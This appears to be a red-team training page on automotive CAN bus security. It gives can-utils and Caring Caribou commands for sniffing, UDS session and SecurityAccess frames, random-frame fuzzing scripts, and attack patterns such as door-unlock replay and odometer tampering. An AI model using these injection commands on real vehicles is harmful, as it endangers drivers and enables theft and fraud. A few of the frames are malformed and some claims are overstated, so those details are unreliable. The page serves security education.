---
layout: training-page
title: "Automotive CAN Bus Security — Red Team Academy"
module: "Wireless"
tags: [can-bus, automotive, obd2, uds, socketcan, caringcaribou, can-utils, vehicle-hacking]
page_key: "wireless-automotive-can"
render_with_liquid: false
updated: "2026-04-17"
---

# Automotive CAN Bus Security

## Overview

The Controller Area Network (CAN) bus is the primary communication backbone in modern vehicles, connecting Electronic Control Units (ECUs) for engine management, braking, infotainment, lighting, and dozens of other systems. CAN was designed in the 1980s for reliability in electrically noisy environments — not for security. There is no authentication, no encryption, and no access control. Any device connected to the CAN bus can read all messages and inject frames that all other ECUs will treat as legitimate.

**Legal and ethical scope**: CAN bus testing must only be performed on vehicles you own or on dedicated test benches with explicit written authorization. Unauthorized modification of vehicle safety systems (brakes, steering, airbags) can cause injury or death. All research cited here is documented academic/security research. Never test on vehicles in traffic or without the ability to immediately abort.

## CAN Bus Architecture

```
# CAN bus fundamentals:

# Physical layer:
# - Two-wire differential bus: CAN_H (High) and CAN_L (Low)
# - Recessive state: CAN_H = CAN_L = ~2.5V (logical 1)
# - Dominant state: CAN_H = 3.5V, CAN_L = 1.5V (logical 0)
# - CSMA/CD with non-destructive bitwise arbitration
#   (lower ID = higher priority; all nodes yield to dominant bit)

# Standard frame format (11-bit ID):
# [SOF 1][Arbitration 11-bit ID][RTR 1][IDE 1][DLG 4][Data 0-64][CRC 15][ACK 2][EOF 7]
# Extended frame format (29-bit ID) — used for J1939 (trucks) and some OBD-II PIDs

# Typical vehicle network topology:
#
# OBD-II port (passenger compartment) ──┐
#                                        ├── OBD-II Diagnostic Bus
# Gateway ECU ──────────────────────────┤
#     │                                  │
#     ├── High-Speed CAN (500 kbps)  ────┤ Engine, Transmission, ABS, Airbags
#     ├── Low-Speed CAN (125 kbps)       │ Body control, Lighting, HVAC
#     ├── LIN bus (19.2 kbps)            │ Windows, mirrors, seat motors (cost-optimized)
#     ├── MOST (optical, 25 Mbps)        │ Infotainment audio
#     └── Ethernet (100BASE-T1)          │ Modern vehicles: ADAS, cameras, radar

# OBD-II port pinout (CAN relevant):
# Pin 4: Chassis ground
# Pin 5: Signal ground
# Pin 6: CAN High (HS-CAN)
# Pin 14: CAN Low (HS-CAN)
# Pin 16: Battery +12V (fused)
```

## Hardware

```
# OBD-II to USB adapters:
# ELM327 (USB or Bluetooth) — ~$10-20
#   Works with OBD-II PIDs, slow for raw CAN
#   ELM327 v1.5 or genuine (avoid fake v2.1 — reduced speed)
#   Software: Torque (Android), OBDFusion, python-OBD

# CANUSB (LAWICEL AB) — ~$100-150
#   Professional, works with socketcan on Linux
#   High-speed: up to 1 Mbps

# PEAK PCAN-USB — ~$150-200
#   Industry standard, excellent driver support
#   Supports: Linux SocketCAN, Windows PEAK API
#   Reliable for long testing sessions

# CANtact — ~$60 (open source hardware)
#   SocketCAN compatible
#   https://cantact.io

# Raspberry Pi + MCP2515 + CAN transceiver — ~$30-50
#   MCP2515 SPI-to-CAN controller + TJA1050 transceiver
#   Wiring: Pi GPIO → SPI → MCP2515 → CAN bus
#   Cost-effective for dedicated test bench

# USB-to-CAN adapter setup (generic):
# Connect CAN_H → Pin 6, CAN_L → Pin 14 of OBD-II Y-cable (or directly to harness)
# Ground → Pin 4 or Pin 5
# Power not needed from OBD-II if adapter is USB-powered
```

## Lab Setup

```
# SocketCAN on Linux — standard kernel CAN framework
# Supported by: PEAK PCAN-USB, CANtact, CANUSB, Raspberry Pi + MCP2515

# Load SocketCAN kernel modules:
sudo modprobe can
sudo modprobe can_raw
sudo modprobe vcan           # Virtual CAN — create a loopback bus for lab testing

# Create virtual CAN interface (no hardware needed for practice):
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0
# Test: cansend vcan0 123#DEADBEEF && candump vcan0

# Configure real CAN interface (e.g., PEAK USB adapter shows as can0):
sudo ip link set can0 up type can bitrate 500000
# Common bitrates:
# 125 kbps — Low-speed CAN (body control)
# 250 kbps — Mid-speed CAN
# 500 kbps — High-speed CAN (engine, transmission, ABS)
# 1000 kbps — Some high-performance vehicle buses

# Verify interface is up:
ip link show can0
# State should be: UP, no BUS-OFF (BUS-OFF = wrong bitrate or wiring issue)

# Bring down interface:
sudo ip link set can0 down
```

## Tools

```
# can-utils — Linux userspace utilities for SocketCAN:
sudo apt install can-utils

# candump — capture all CAN frames:
candump can0                              # All frames
candump can0 -l                           # Log to file (candump-YYYYMMDD.log)
candump can0 123:7FF                      # Filter: ID 0x123 only
candump can0 000:000                      # Filter: all frames (no filter)
candump vcan0 -t a                        # Show absolute timestamps

# cansend — transmit a single frame:
cansend can0 7DF#0201050000000000         # OBD-II PID 0x05 (coolant temp)
cansend can0 200#0A                       # ID 0x200, one byte 0x0A

# cansniffer — real-time delta display (highlights changing bytes):
cansniffer -c can0                        # Color-coded changes
# Press 'b' to subscribe to a single ID, 'n' to reset

# canreplay — replay a captured log:
canreplay -I candump.log can0

# cangen — generate random/patterned CAN traffic (fuzzing):
cangen can0 -g 5 -I 200 -L 8 -D DEADBEEF00000000  # Specific ID + data
cangen can0 -g 1 -R -v                              # Random frames, verbose

# Caring Caribou — comprehensive vehicle security test tool:
pip install caringcaribou
# Or: git clone https://github.com/CaringCaribou/caringcaribou

# Caring Caribou UDS scanner:
caringcaribou uds discovery                         # Find UDS-capable ECUs
caringcaribou uds services 0x7DF 0x7E8              # Enumerate supported services
caringcaribou uds dump_dids 0x7DF 0x7E8             # Dump all Data Identifiers

# SavvyCAN — GUI for CAN analysis:
# https://github.com/collin80/SavvyCAN
# Features: graphing, protocol reverse engineering, DBC file import
```

## CAN Sniffing and Traffic Analysis

```
# Phase 1: Baseline capture
# - Vehicle in known state (ignition ON, engine OFF)
# - Record 30 seconds of idle CAN traffic
candump can0 -l &
sleep 30
kill %1
# Baseline shows: recurring ECU heartbeats, sensor polling, CAN ID population

# Phase 2: Action correlation
# - Perform discrete physical actions while recording
# - Note time of each action → correlate to CAN ID changes
candump can0 -t a > action_capture.txt &
echo "$(date) - Press brake pedal" >> notes.txt   # Record at time of action

# Example correlation workflow:
# 1. Start recording
# 2. Press brake pedal
# 3. Release brake pedal
# 4. Observe: which CAN IDs change value when brake pressed?
# 5. Correlate in cansniffer (-c mode highlights changes in real-time)

# cansniffer workflow for correlation:
cansniffer -c can0
# Initial: all IDs appear in display
# When brake pressed: changed bytes highlighted in color
# Note: ID 0x1A0 or similar changes → brake status CAN ID identified

# Phase 3: Build ID map
# Common CAN IDs (varies by OEM — build your own map per vehicle):
# Engine RPM:         typically 0x0C0 – 0x100
# Vehicle speed:      typically 0x1A0 – 0x200
# Steering angle:     typically 0x2B0
# Door status:        typically 0x42C – 0x430
# Fuel level:         typically 0x350
# Turn signals:       typically 0x380

# DBC files — define CAN signal encoding:
# Vector DBC format: name, ID, signals, bit positions, scaling
# Search for your vehicle's DBC: https://github.com/commaai/opendbc
```

## UDS (Unified Diagnostic Services) Exploitation

```
# UDS is the diagnostic protocol for ECU communication (ISO 14229)
# All OBD-II compliant vehicles support UDS on the OBD-II port
# Functional addressing: 0x7DF → all ECUs respond
# Physical addressing: each ECU has specific request/response ID pair
#   Common: request 0x7E0, response 0x7E8

# Key UDS Service IDs:
# 0x10 DiagnosticSessionControl  — switch between Default, Programming, Extended sessions
# 0x11 ECUReset                  — reset ECU (soft/hard)
# 0x14 ClearDiagnosticInfo       — clear fault codes
# 0x19 ReadDTCInformation        — read fault codes (DTC)
# 0x22 ReadDataByIdentifier      — read specific data values by DID
# 0x27 SecurityAccess            — unlock ECU for write operations (seed/key exchange)
# 0x2E WriteDataByIdentifier     — write data to ECU memory
# 0x2F InputOutputControlByID    — directly control ECU outputs
# 0x31 RoutineControl            — run ECU routines (self-test, calibration)
# 0x34 RequestDownload           — begin flash programming
# 0x36 TransferData              — transfer firmware
# 0x3E TesterPresent             — keep diagnostic session alive

# Using Caring Caribou for UDS attacks:

# Discover ECU IDs:
caringcaribou uds discovery -min 0x700 -max 0x7FF

# Enter extended diagnostic session (enables more services):
# CAN frame: ID=0x7DF, Data=02 10 03 00 00 00 00 00
# (0x10 = DiagnosticSessionControl, 0x03 = extendedDiagnosticSession)
cansend can0 7DF#021003000000000

# Read DID 0xF190 (VIN number):
caringcaribou uds read_data_id 0x7DF 0x7E8 0xF190
# Or: cansend can0 7DF#0322F19000000000
# Response: 62 F1 90 [17 bytes of VIN]

# SecurityAccess — unlock ECU for write operations:
# Step 1: Request seed (0x27 + subfunction 0x01 = request seed for level 1):
cansend can0 7E0#0227010000000000
# Response: 67 01 [4-byte seed]

# Step 2: Calculate key from seed using ECU-specific algorithm
# (Algorithm is manufacturer-proprietary — obtained from firmware dump or reverse engineering)
# Common algorithms: KeeLoq, AES, XOR-based
# Key = f(seed, manufacturer_secret_constant)

# Step 3: Send calculated key:
cansend can0 7E0#0627020DEADBEEF  # 0x27 subfunction 0x02 = send key

# Caring Caribou security access fuzzer:
caringcaribou uds security_seed_randomness -n 100 0x7E0 0x7E8
# Tests if seed is random or predictable

# InputOutputControlByID — control physical outputs:
# Example: activate horn (if supported and unlocked)
# First: enter extended session, perform security access, then:
cansend can0 7DF#042F0300030300    # ControlOptionRecord = shortTermAdjustment
# This is vehicle/ECU specific — identify DID via DID dump first
```

## Fuzzing

```
# Random CAN frame injection:
cangen can0 -g 1 -I RANDOM -L RANDOM -D RANDOM -v
# Observe: ECU behavior, error frames, BUS-OFF states

# Targeted ID fuzzing (test specific ECU with unknown protocol):
# Send all possible byte values to a known command ID:
python3 - <<'EOF'
import subprocess, time
for val in range(0, 256):
    frame = f"7DF#02{val:02X}0000000000"
    subprocess.run(["cansend", "can0", frame])
    time.sleep(0.05)
print("Fuzzing complete")
EOF

# Caring Caribou UDS fuzzer:
caringcaribou fuzzer random can0   # Random ID + data
caringcaribou fuzzer identify can0 --id 0x7E0  # Targeted ID fuzzing

# DIY Python fuzzer with python-can:
pip install python-can
python3 - <<'EOF'
import can, random, time
bus = can.Bus(interface='socketcan', channel='vcan0')
for i in range(1000):
    arb_id = random.randint(0x000, 0x7FF)
    data = [random.randint(0, 255) for _ in range(8)]
    msg = can.Message(arbitration_id=arb_id, data=data, is_extended_id=False)
    bus.send(msg)
    time.sleep(0.01)
EOF
```

## Known Attack Patterns

```
# Jeep Cherokee remote exploitation (Valasek + Miller, DEF CON 2015):
# - Connected via Sprint cellular network to infotainment system
# - Pivoted from infotainment to CAN bus via D-Bus IPC
# - Injected CAN frames: disabled brakes, cut engine, controlled steering at low speed
# - Affected: ~1.4M vehicles recalled, FCA patch issued
# - Technical path: UConnect infotainment → chip-level CAN bus connection
# - Key learning: infotainment should be isolated from powertrain CAN via gateway

# OBD-II port relay attacks:
# Many vehicles accept CAN injection via OBD-II without security access
# Plug a CAN injection device into OBD-II port → immediate bus access
# Physical security of OBD-II port is critical (often under dashboard, accessible)

# Door unlock via CAN replay:
# Capture: door unlock CAN frame when keyfob unlocks vehicle
# Replay: inject same frame → all doors unlock
# Common vulnerability: simple OOK keyfob → captured via sub-GHz replay
# Then inject corresponding CAN frame via OBD-II adapter

# Odometer manipulation via UDS WriteDataByIdentifier:
# DID for odometer value exists in instrument cluster ECU
# Requires: SecurityAccess bypass + knowledge of DID and data format
# Forensic detection: discrepancy in service history, tire wear, steering play
# Legal note: odometer fraud is a criminal offense in most jurisdictions

# Speedometer manipulation (for testing dashboards):
# Inject vehicle speed CAN message (known ID for target vehicle)
# Instrument cluster reads speed from CAN, not directly from wheel sensors
```

## OBD-II Diagnostic Attacks

```
# Standard OBD-II PIDs (Mode 01 — current data):
# PID 0x05: Engine coolant temperature
# PID 0x0C: Engine RPM
# PID 0x0D: Vehicle speed
# PID 0x1C: OBD standard vehicle complies with
# PID 0x49: VIN

# Request all supported PIDs:
cansend can0 7DF#0201000000000000  # PIDs 01-20
cansend can0 7DF#0220000000000000  # PIDs 21-40
cansend can0 7DF#0240000000000000  # PIDs 41-60

# Read fault codes (DTCs) — Mode 03:
cansend can0 7DF#0103000000000000

# Clear fault codes — Mode 04:
cansend can0 7DF#0104000000000000
# Caution: clearing codes removes evidence of ECU issues

# Read freeze frame data (snapshot when fault occurred) — Mode 02:
cansend can0 7DF#0302FF0000000000  # PID 0xFF = all freeze frame data

# python-OBD for high-level OBD-II interaction:
pip install obd
python3 - <<'EOF'
import obd
connection = obd.OBD()  # Auto-connects to ELM327
cmd = obd.commands.RPM
response = connection.query(cmd)
print(f"Engine RPM: {response.value}")
EOF
```
